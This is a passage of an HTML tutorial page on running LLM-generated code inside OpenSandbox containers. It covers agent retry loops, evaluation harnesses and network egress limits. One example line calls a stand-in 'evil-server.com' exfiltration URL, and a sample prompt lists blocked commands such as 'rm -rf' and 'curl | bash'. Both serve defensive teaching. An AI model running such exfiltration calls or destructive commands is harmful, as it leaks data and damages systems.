+      <details class="reveal">
+        <summary>How does this compare to ChatGPT&#x27;s Code Interpreter?</summary>
+        <div class="reveal-body"><p>ChatGPT&#x27;s Code Interpreter is essentially the same idea — a sandboxed Python environment that runs code and returns results. The difference is ownership and flexibility:</p>
+
+<ul>
+<li><strong>ChatGPT&#x27;s</strong>: managed by OpenAI, you can&#x27;t customize the environment, you can&#x27;t control network access, you can&#x27;t use it outside of ChatGPT</li>
+<li><strong>OpenSandbox</strong>: you run the server, you pick the Docker image, you control network egress, you can use it with ANY LLM or agent framework</li>
+</ul>
+
+<p>For hobby projects, ChatGPT&#x27;s built-in interpreter is fine. For production agent systems where you need custom packages, security controls, or scale — that&#x27;s where OpenSandbox earns its keep.</p></div>
+      </details>
+      </div>
+    </div>
+    <div class="decision-point">
+      <h3>Quick Check</h3>
+      <div class="question">Your AI coding agent generates a Python script that installs `numpy` and processes some data. Where should it execute this code?</div>
+      
+        <div class="decision-option">
+          <input type="radio" name="decision_6" id="decision_6_opt0">
+          <label for="decision_6_opt0">In an OpenSandbox container with the Code Interpreter</label>
+          <div class="decision-feedback correct">&#10003; Correct! This is exactly the use case. The sandbox isolates the pip install and execution. If the LLM-generated code has bugs or does something unexpected, it&#x27;s contained. The sandbox gets destroyed after, so no leftover packages pollute your environment.</div>
+        </div>
+        <div class="decision-option">
+          <input type="radio" name="decision_6" id="decision_6_opt1">
+          <label for="decision_6_opt1">Directly on the host machine in a subprocess</label>
+          <div class="decision-feedback incorrect">&#10007; Not quite. Running LLM-generated code directly on your machine is risky. Even if you trust the LLM, hallucinated package names could install malware from PyPI, and buggy file operations could modify real files. Sandboxing exists precisely to avoid this.</div>
+        </div>
+        <div class="decision-option">
+          <input type="radio" name="decision_6" id="decision_6_opt2">
+          <label for="decision_6_opt2">In a Python virtual environment on the host</label>
+          <div class="decision-feedback incorrect">&#10007; Not quite. A virtualenv isolates Python packages but does NOT isolate the filesystem or network. The generated code can still read your files, make network requests, or run system commands. It&#x27;s package isolation, not security isolation — a very different thing.</div>
+        </div>
+    </div>
+    <div class="step-section">
+      <div class="step-header">
+        <div class="step-number">4</div>
+        <h2>Wire It Into an Agent Loop — The Real Architecture</h2>
+      </div>
+      <div class="step-body">
+        <p>So we can create sandboxes and run code. Cool. But the real magic happens when you plug this into an <strong>agent loop</strong>. Here&#x27;s the pattern that most coding agents follow:</p>
+
+<ol>
+<li>User gives a task → &quot;Write a function that sorts a list of dictionaries by a nested key&quot;</li>
+<li>LLM generates code</li>
+<li>Agent sends the code to a sandbox for execution</li>
+<li>Sandbox returns output (or errors)</li>
+<li>Agent feeds the result back to the LLM: &quot;Your code raised a KeyError on line 3&quot;</li>
+<li>LLM fixes the code, go to step 3</li>
+<li>Repeat until the code works</li>
+</ol>
+
+<p>This loop is the heart of every coding assistant. The sandbox is step 3-4 — the <strong>safe execution layer</strong> between the LLM brain and the real world.</p>
+
+<p>Let&#x27;s get our agent to build a simple version of this loop.</p>
+        
+      <div class="agent-interaction">
+        <div class="agent-goal">
+          <div class="agent-goal-label">Ask your agent</div>
+          Get the agent to build a simple &#x27;generate-execute-iterate&#x27; loop: take a coding task as input, send it to an LLM, run the generated code in an OpenSandbox, capture errors, and retry up to 3 times
+        </div>
+        
+        <div class="agent-hints">
+          <div class="agent-hints-label">Think about it</div>
+          <ul><li>What LLM client should the agent use to generate the code? (Any will do — OpenAI, Anthropic, etc.)</li><li>How should the agent capture both stdout AND stderr from the sandbox execution? Errors are the key signal for iteration.</li><li>What&#x27;s the exit condition? When does the loop stop retrying?</li><li>How would you structure the prompt to the LLM on retry? It needs to see the previous code AND the error message.</li></ul>
+        </div>
+        
+      <details class="reveal">
+        <summary>What the agent gives back</summary>
+        <div class="reveal-body"><p>The agent should give you a function that takes a task description, calls an LLM to generate code, runs it in a sandbox via the Code Interpreter, checks for errors, and if there are errors, feeds the code + error back to the LLM for another attempt. The key insight is the retry prompt — something like: <em>&#x27;Your previous code produced this error: {error}. Here was the code: {code}. Fix it.&#x27;</em></p>
+
+<p>The overall structure is a <code>for</code> loop (max 3 iterations) wrapping two async calls: one to the LLM API, one to <code>interpreter.codes.run()</code>. If the result has no errors, break early. The sandbox stays alive for the whole loop so state persists between attempts.</p>
+
+<p>This is conceptually simple but incredibly powerful — it&#x27;s the same pattern that makes Devin, Claude Code, and similar tools work.</p></div>
+      </details>
+      </div>
+        
+        
+      <div class="callout callout-api-key-note">
+        <div class="callout-label">API Key Note</div>
+        You&#x27;ll need an API key for whatever LLM you use in the agent loop (OpenAI, Anthropic, etc.). The OpenSandbox server itself doesn&#x27;t require an API key — it&#x27;s all local.
+      </div>
+      <div class="callout callout-tip">
+        <div class="callout-label">Tip</div>
+        Pro move: set a short timeout on the sandbox execution (like 30 seconds per run). If the LLM generates an infinite loop, you don&#x27;t want to wait 10 minutes to find out.
+      </div>
+        
+      <details class="reveal">
+        <summary>What about network egress controls?</summary>
+        <div class="reveal-body"><p>One of OpenSandbox&#x27;s underrated features is <strong>per-sandbox egress controls</strong>. You can specify which external hosts the sandbox is allowed to reach. This matters because:</p>
+
+<ul>
+<li>If your LLM generates code that does <code>requests.get(&#x27;https://evil-server.com/exfiltrate&#x27;)</code>, the sandbox can block it</li>
+<li>You might want to allow <code>pypi.org</code> (for pip installs) but block everything else</li>
+<li>For evaluation pipelines, you want zero network access to prevent cheating</li>
+</ul>
+
+<p>This is configured in the <code>~/.sandbox.toml</code> file or per-sandbox at creation time. It&#x27;s the kind of thing you don&#x27;t think about until something goes wrong — and then you&#x27;re really glad it&#x27;s there.</p></div>
+      </details>
+      <details class="reveal">
+        <summary>How does this scale to production?</summary>
+        <div class="reveal-body"><p>Locally, OpenSandbox uses Docker — one container per sandbox. This works fine for development and small-scale use (maybe 10-20 concurrent sandboxes).</p>
+
+<p>For production, OpenSandbox supports a <strong>Kubernetes runtime</strong> that can handle hundreds or thousands of concurrent sandboxes. The API is the same — you just change the runtime configuration. This is how you&#x27;d build something like a coding interview platform or an automated grading system that needs to evaluate submissions at scale.</p>
+
+<p>The architecture is also designed for this: the server is stateless, sandboxes are ephemeral containers, and the protocol is standardized. You could even run multiple servers behind a load balancer.</p></div>
+      </details>
+      </div>
+    </div>
+    <div class="checkpoint">
+      <div class="checkpoint-icon">&#10003;</div>
+      <div>You now have the full picture: a running server, sandbox lifecycle management, a Code Interpreter for executing code, and the agent loop pattern that ties it all together. You&#x27;ve essentially built the execution layer of a coding assistant.</div>
+    </div>
+    <div class="step-section">
+      <div class="step-header">
+        <div class="step-number">5</div>
+        <h2>Bonus: Sandboxes for Agent Evaluation</h2>
+      </div>
+      <div class="step-body">
+        <p>Here&#x27;s a use case that doesn&#x27;t get enough attention: <strong>using sandboxes to evaluate your AI agents themselves.</strong></p>
+
+<p>Imagine you&#x27;re building a coding agent and you want to know: &quot;Can my agent correctly solve 100 Python problems?&quot; You need to:</p>
+
+<ol>
+<li>Give each problem to your agent</li>
+<li>Let the agent generate code</li>
+<li>Run that code against test cases</li>
+<li>Score the results</li>
+</ol>
+
+<p>Every single run needs its own isolated sandbox. You can&#x27;t let test runs interfere with each other. You can&#x27;t let a rogue agent break the evaluation environment for the next test.</p>
+
+<p>This is exactly what benchmarks like HumanEval and SWE-bench do — and OpenSandbox is built for it. You can spin up dozens of sandboxes in parallel, each running a different test case, all isolated from each other.</p>
+
+<p>The evaluation pipeline is just a variation of the agent loop from Step 4, but running in parallel across many tasks.</p>
+        
+      <div class="agent-interaction">
+        <div class="agent-goal">
+          <div class="agent-goal-label">Ask your agent</div>
+          Get the agent to sketch an evaluation harness: given a list of coding problems (each with a prompt and test cases), run your agent on each one in a separate sandbox and collect pass/fail results
+        </div>
+        
+        <div class="agent-hints">
+          <div class="agent-hints-label">Think about it</div>
+          <ul><li>How would you run multiple sandboxes concurrently? Think about Python&#x27;s async concurrency primitives.</li><li>Each sandbox needs to be independent — why is this important for evaluation integrity?</li><li>How do you determine pass/fail? The test cases need to run AFTER the agent&#x27;s generated code.</li><li>What information do you need to collect from each run for scoring?</li></ul>
+        </div>
+        
+      <details class="reveal">
+        <summary>What the agent gives back</summary>
+        <div class="reveal-body"><p>The agent should describe a pattern where you use <code>asyncio.gather()</code> (or similar) to create multiple sandboxes in parallel, each running one problem. For each sandbox: inject the agent&#x27;s generated code, then run the test cases, then check if all tests passed. Collect results into a simple list of pass/fail outcomes.</p>
+
+<p>The key architectural insight is that each sandbox is completely isolated — problem 47&#x27;s runaway infinite loop can&#x27;t affect problem 48&#x27;s evaluation. This is why containers matter for eval, not just security.</p></div>
+      </details>
+      </div>
+        
+        
+      <div class="callout callout-tip">
+        <div class="callout-label">Tip</div>
+        For evaluation, set strict timeouts (30-60 seconds) and disable network egress entirely. You want to test the agent&#x27;s code generation ability, not its ability to curl Stack Overflow.
+      </div>
+        
+      <details class="reveal">
+        <summary>What other sandbox scenarios does OpenSandbox support?</summary>
+        <div class="reveal-body"><p>Beyond code execution and evaluation, OpenSandbox has built-in support for some surprisingly rich scenarios:</p>
+
+<ul>
+<li><strong>Browser automation</strong>: Sandboxes can include Chrome and Playwright, so your GUI agent can navigate websites in an isolated browser</li>
+<li><strong>Desktop environments</strong>: VNC-based sandboxes give your agent a full desktop with VS Code — useful for testing GUI interactions</li>
+<li><strong>RL training</strong>: Reinforcement learning environments where the agent interacts with a sandbox as its environment</li>
+</ul>
+
+<p>The common thread is isolation. Any time you want an AI agent to interact with something that could be dangerous or unpredictable, stick a sandbox boundary around it.</p></div>
+      </details>
+      </div>
+    </div>
+    <div class="your-turn">
+      <h3>Your Turn</h3>
+      <div class="your-turn-goal">Build a &#x27;safe shell&#x27; tool: an MCP-style tool that your AI agent can call to execute arbitrary shell commands, but with guardrails — timeout limits, blocked commands (no rm -rf, no sudo), and output truncation for long results</div>
+      <div class="your-turn-context">One of the most common tools in any agent toolkit is &#x27;run a shell command.&#x27; But you want it to be safe. This is your chance to think about what guardrails an execution tool needs, and prompt your agent to build one using OpenSandbox as the backend.</div>
+      
+      <div class="agent-hints">
+        <div class="agent-hints-label">Think about it</div>
+        <ul><li>What dangerous commands should be blocked? Think about both destructive commands and commands that could escape the sandbox.</li><li>How long should command output be before you truncate it? LLMs have context limits, so dumping 10,000 lines of logs is wasteful.</li><li>Should the sandbox persist between tool calls (stateful) or be fresh each time (stateless)? What are the trade-offs?</li><li>How would you format the tool&#x27;s response so it&#x27;s useful for the LLM to reason about?</li></ul>
+      </div>
+      
+      <details class="reveal">
+        <summary>See a sample prompt</summary>
+        <div class="reveal-body">
+          <div class="code-block">
+            <span class="code-caption">One way you could prompt it</span>
+            <button class="copy-btn">COPY</button>
+            <pre><code>Build me a Python async function called `safe_execute` that takes a shell command string and runs it inside an OpenSandbox container. Requirements: (1) Block any command containing &#x27;rm -rf&#x27;, &#x27;sudo&#x27;, &#x27;chmod 777&#x27;, or &#x27;curl | bash&#x27; — return an error message instead. (2) Set a 30-second timeout on execution. (3) Truncate stdout and stderr to 2000 characters each, adding &#x27;[truncated]&#x27; if needed. (4) Return a dict with &#x27;stdout&#x27;, &#x27;stderr&#x27;, &#x27;exit_code&#x27;, and &#x27;truncated&#x27; boolean. Use the opensandbox Python SDK and assume the server is already running locally.</code></pre>
+          </div>
+        </div>
+      </details>
+    </div>
+    <div class="decision-point">
+      <h3>Quick Check</h3>
+      <div class="question">You&#x27;re building a coding agent that needs to install Python packages during execution. How should you configure the sandbox&#x27;s network egress?</div>
+      
+        <div class="decision-option">
+          <input type="radio" name="decision_11" id="decision_11_opt0">
+          <label for="decision_11_opt0">Allow pypi.org and block everything else</label>
+          <div class="decision-feedback correct">&#10003; Correct! This follows the principle of least privilege. The sandbox can install packages (which your agent needs) but can&#x27;t make arbitrary HTTP requests, exfiltrate data, or download external scripts. It&#x27;s the right balance of functionality and security.</div>
+        </div>
+        <div class="decision-option">
+          <input type="radio" name="decision_11" id="decision_11_opt1">
+          <label for="decision_11_opt1">Allow all outbound network traffic</label>
+          <div class="decision-feedback incorrect">&#10007; Not quite. This defeats much of the purpose of sandboxing. LLM-generated code could make arbitrary network requests — downloading malicious scripts, posting data to external servers, or accessing internal services. Network isolation is one of OpenSandbox&#x27;s key security features.</div>
+        </div>
+        <div class="decision-option">
+          <input type="radio" name="decision_11" id="decision_11_opt2">
+          <label for="decision_11_opt2">Block all network traffic completely</label>
+          <div class="decision-feedback incorrect">&#10007; Not quite. Too restrictive for this use case. If the agent can&#x27;t pip install packages, it&#x27;ll fail on most real-world coding tasks. Zero-network is appropriate for evaluation/benchmarking, but not for a general coding assistant.</div>
+        </div>
+    </div>
+    <div class="recap-section">
+      <h2>Recap</h2>
+      <div class="recap-body"><p>We went from zero to a working sandbox-backed agent execution layer. Here&#x27;s the journey:</p>
+
+<p><strong>Server setup</strong> — We installed the OpenSandbox server and pointed it at Docker. One config file, three commands, done.</p>
+
+<p><strong>Sandbox lifecycle</strong> — We created containers on demand, ran commands, did file I/O, and cleaned up safely with <code>async with</code>. The disposable laptop mental model.</p>
+
+<p><strong>Code Interpreter</strong> — We layered a stateful REPL on top of the sandbox, so our agent can iterate on code just like a developer would in a Jupyter notebook.</p>
+
+<p><strong>The agent loop</strong> — We wired it all together: LLM generates code → sandbox runs it → errors feed back to the LLM → iterate until it works. This is the pattern behind every coding assistant.</p>
+
+<p><strong>Evaluation at scale</strong> — We saw how the same infrastructure powers agent benchmarking — parallel sandboxes, isolated test runs, automated scoring.</p>
+
+<p>The big idea? <strong>Sandboxing isn&#x27;t just about safety — it&#x27;s about giving your agent permission to be bold.</strong> When the blast radius of a mistake is zero, your agent can try wild things, fail fast, and learn. That&#x27;s how you build agents that actually work.</p></div>
+      <ul class="takeaways-list"><li>OpenSandbox gives AI agents isolated Docker/K8s containers to safely run arbitrary code — the execution layer every coding agent needs</li><li>The Code Interpreter provides stateful execution (variables persist between runs), enabling the generate-execute-iterate loop that makes coding agents effective</li><li>Network egress controls let you decide exactly what your sandbox can access — critical for both security and evaluation integrity</li><li>The same infrastructure works for development (Docker, single sandbox) and production (Kubernetes, thousands of concurrent sandboxes)</li><li>Sandboxes aren&#x27;t just safety theater — they unlock bolder agent behavior by making failure cheap and contained</li></ul>
+      
+      <div class="next-steps">
+        <h3>Where to go next</h3>
+        <ul><li>Explore OpenSandbox&#x27;s browser automation examples — sandboxed Chrome instances for GUI agents</li><li>Try building a full coding assistant that uses OpenSandbox as its execution backend with your preferred LLM</li><li>Look into the Kubernetes runtime for scaling sandbox-based evaluations across dozens of problems in parallel</li><li>Experiment with egress policies — try building a sandbox that can only access specific APIs your agent needs</li></ul>
+      </div>
+    </div>
+    <div class="sources-section">
+      <h3>Sources</h3>
+      <ul class="sources-list"><li><a href="https://github.com/alibaba/OpenSandbox" target="_blank" rel="noopener">alibaba/OpenSandbox</a> <span class="source-name">(GitHub Trending Python)</span></li></ul>
+    </div>
+    <div class="other-articles">
+      <h3>What else was in the news</h3>
+      <p class="oa-intro">These articles were also available today. Vote to help shape future sessions.</p>
+      
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">A case for Go as the best language for AI agents</div>
+            <div class="oa-summary">Argues Go&#x27;s concurrency, simplicity, and performance make it ideal for building AI agent systems.</div>
+            <div class="oa-meta">Hacker News AI · Mar 2</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_0" value="up" id="vote_0_up" class="oa-toggle" data-idx="0">
+            <label for="vote_0_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_0" value="down" id="vote_0_down" class="oa-toggle" data-idx="0">
+            <label for="vote_0_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">NanmiCoder/MediaCrawler</div>
+            <div class="oa-summary">Web scraper for Chinese social platforms including Xiaohongshu, Douyin, Bilibili, Weibo, and Zhihu.</div>
+            <div class="oa-meta">GitHub Trending Python</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_1" value="up" id="vote_1_up" class="oa-toggle" data-idx="1">
+            <label for="vote_1_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_1" value="down" id="vote_1_down" class="oa-toggle" data-idx="1">
+            <label for="vote_1_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">EbookFoundation/free-programming-books</div>
+            <div class="oa-summary">Community-curated list of free programming books and learning resources in many languages.</div>
+            <div class="oa-meta">GitHub Trending Python</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_2" value="up" id="vote_2_up" class="oa-toggle" data-idx="2">
+            <label for="vote_2_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_2" value="down" id="vote_2_down" class="oa-toggle" data-idx="2">
+            <label for="vote_2_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">Claude Code LSP</div>
+            <div class="oa-summary">Integrates Claude Code as a Language Server Protocol provider for IDE-based AI assistance.</div>
+            <div class="oa-meta">Hacker News AI · Mar 2</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_3" value="up" id="vote_3_up" class="oa-toggle" data-idx="3">
+            <label for="vote_3_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_3" value="down" id="vote_3_down" class="oa-toggle" data-idx="3">
+            <label for="vote_3_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">Elevated Errors in Claude.ai</div>
+            <div class="oa-summary">Anthropic status page incident reporting elevated error rates affecting Claude.ai users.</div>
+            <div class="oa-meta">Hacker News AI · Mar 3</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_4" value="up" id="vote_4_up" class="oa-toggle" data-idx="4">
+            <label for="vote_4_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_4" value="down" id="vote_4_down" class="oa-toggle" data-idx="4">
+            <label for="vote_4_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">Ars Technica fires reporter after AI controversy involving fabricated quotes</div>
+            <div class="oa-summary">Ars Technica terminated a reporter caught using AI to fabricate quotes in published articles.</div>
+            <div class="oa-meta">Hacker News AI · Mar 3</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_5" value="up" id="vote_5_up" class="oa-toggle" data-idx="5">
+            <label for="vote_5_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_5" value="down" id="vote_5_down" class="oa-toggle" data-idx="5">
+            <label for="vote_5_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">Meta’s AI smart glasses and data privacy concerns</div>
+            <div class="oa-summary">Article URL:...</div>
+            <div class="oa-meta">Hacker News AI · Mar 2</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_6" value="up" id="vote_6_up" class="oa-toggle" data-idx="6">
+            <label for="vote_6_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_6" value="down" id="vote_6_down" class="oa-toggle" data-idx="6">
+            <label for="vote_6_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">Apple AI servers unused in warehouses due to low Apple Intelligence usage</div>
+            <div class="oa-summary">Apple&#x27;s dedicated AI server hardware sits idle in warehouses because Apple Intelligence adoption is lower than expected.</div>
+            <div class="oa-meta">Hacker News AI · Mar 2</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_7" value="up" id="vote_7_up" class="oa-toggle" data-idx="7">
+            <label for="vote_7_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_7" value="down" id="vote_7_down" class="oa-toggle" data-idx="7">
+            <label for="vote_7_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">The Looming AI Clownpocalypse</div>
+            <div class="oa-summary">Essay warning that AI-generated content flooding will create an absurd, low-quality information landscape.</div>
+            <div class="oa-meta">Hacker News AI · Mar 2</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_8" value="up" id="vote_8_up" class="oa-toggle" data-idx="8">
+            <label for="vote_8_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_8" value="down" id="vote_8_down" class="oa-toggle" data-idx="8">
+            <label for="vote_8_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+        <div class="other-article-card">
+          <div class="oa-info">
+            <div class="oa-title">Claude hits #1 on the App Store as users rally behind Anthropic</div>
+            <div class="oa-summary">Claude app tops the App Store as users show support during Anthropic&#x27;s standoff with the US government.</div>
+            <div class="oa-meta">Hacker News AI · Mar 2</div>
+          </div>
+          <div class="oa-votes">
+            <input type="radio" name="vote_9" value="up" id="vote_9_up" class="oa-toggle" data-idx="9">
+            <label for="vote_9_up" class="oa-toggle-label vote-up" title="More like this">&#x25B2;</label>
+            <input type="radio" name="vote_9" value="down" id="vote_9_down" class="oa-toggle" data-idx="9">
+            <label for="vote_9_down" class="oa-toggle-label vote-down" title="Not interested">&#x25BC;</label>
+          </div>
+        </div>
+      <div class="oa-submit-row">
+        <button id="oa-submit" class="oa-submit-btn" disabled>Submit votes</button>
+        <span id="oa-hint" class="oa-submit-hint">Select at least one vote</span>
+      </div>
+    </div>
+    <script>
+    (function() {
+      var articles = [{"title": "A case for Go as the best language for AI agents", "tags": "agents", "source": "Hacker News AI"}, {"title": "NanmiCoder/MediaCrawler", "tags": "coding", "source": "GitHub Trending Python"}, {"title": "EbookFoundation/free-programming-books", "tags": "coding", "source": "GitHub Trending Python"}, {"title": "Claude Code LSP", "tags": "coding", "source": "Hacker News AI"}, {"title": "Elevated Errors in Claude.ai", "tags": "", "source": "Hacker News AI"}, {"title": "Ars Technica fires reporter after AI controversy involving fabricated quotes", "tags": "", "source": "Hacker News AI"}, {"title": "Meta’s AI smart glasses and data privacy concerns", "tags": "", "source": "Hacker News AI"}, {"title": "Apple AI servers unused in warehouses due to low Apple Intelligence usage", "tags": "", "source": "Hacker News AI"}, {"title": "The Looming AI Clownpocalypse", "tags": "", "source": "Hacker News AI"}, {"title": "Claude hits #1 on the App Store as users rally behind Anthropic", "tags": "", "source": "Hacker News AI"}];
+      var repo = "coldbrewnosugar/ai-course";
+      var track = "general";
+      var date = "2026-03-03";
+
+      var toggles = document.querySelectorAll('.oa-toggle');
+      var btn = document.getElementById('oa-submit');
+      var hint = document.getElementById('oa-hint');
+
+      function updateBtn() {
+        var any = false;
+        toggles.forEach(function(t) { if (t.checked) any = true; });
+        btn.disabled = !any;
+        hint.textContent = any ? '' : 'Select at least one vote';
+      }
+      toggles.forEach(function(t) { t.addEventListener('change', updateBtn); });
+
+      btn.addEventListener('click', function() {
+        var lines = [];
+        for (var i = 0; i < articles.length; i++) {
+          var up = document.getElementById('vote_' + i + '_up');
+          var down = document.getElementById('vote_' + i + '_down');
+          var vote = '';
+          if (up && up.checked) vote = 'up';
+          if (down && down.checked) vote = 'down';
+          if (vote) {
+            lines.push(vote + ' | ' + articles[i].title + ' | tags:' + articles[i].tags + ' | source:' + articles[i].source);
+          }
+        }
+        if (lines.length === 0) return;
+
+        var body = 'track:' + track + '\ndate:' + date + '\n\n' + lines.join('\n');
+        var title = 'Votes from ' + date + ' (' + track + ')';
+        var url = 'https://github.com/' + repo + '/issues/new?labels=vote&title=' +
+          encodeURIComponent(title) + '&body=' + encodeURIComponent(body);
+        window.open(url, '_blank');
+      });
+    })();</script>
+    <footer class="session-footer">
+      <span>Tinker</span> &middot; Build with AI, daily
+    </footer>
+  </div>
+  <script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Copy-to-clipboard
+  document.querySelectorAll('.copy-btn').forEach(function(btn) {
+    btn.addEventListener('click', function() {
+      var code = btn.closest('.code-block').querySelector('code').textContent;
+      navigator.clipboard.writeText(code).then(function() {
+        btn.textContent = 'COPIED';
+        btn.classList.add('copied');
+        setTimeout(function() {
+          btn.textContent = 'COPY';
+          btn.classList.remove('copied');
+        }, 2000);
+      });
+    });
+  });
+});
+</script>
+</body>
+</html>
